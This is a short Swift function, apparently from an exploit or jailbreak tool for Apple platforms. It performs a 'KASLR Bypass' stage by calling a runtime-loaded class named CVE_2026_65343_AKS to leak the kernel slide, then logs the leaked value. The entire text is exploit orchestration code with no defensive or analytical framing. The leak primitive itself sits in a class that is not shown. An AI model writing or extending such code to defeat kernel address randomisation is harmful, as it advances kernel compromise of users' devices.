private func performKASLRStage() async -> UInt64? {
    exploitState = .executingKASLR
    log("[*] Stage: KASLR Bypass", level: .info)
    
    // Use CVE_2026_65343_AKS directly
    guard let aksClass = NSClassFromString("CVE_2026_65343_AKS") as? NSObject.Type,
          let aksInstance = aksClass.perform(NSSelectorFromString("sharedInstance"))?.takeUnretainedValue() as? NSObject,
          aksInstance.responds(to: NSSelectorFromString("leakKernelSlide")) else {
        log("[-] AKS class not available", level: .error)
        return nil
    }
    
    let result = aksInstance.perform(NSSelectorFromString("leakKernelSlide"))?.takeUnretainedValue() as? NSNumber
    let slide = result?.uint64Value ?? 0
    
    guard slide != 0 else {
        log("[-] AKS leak failed", level: .error)
        return nil
    }
    
    log("[+] KASLR slide: 0x\(String(slide, radix: 16))", level: .success)
    return slide
}
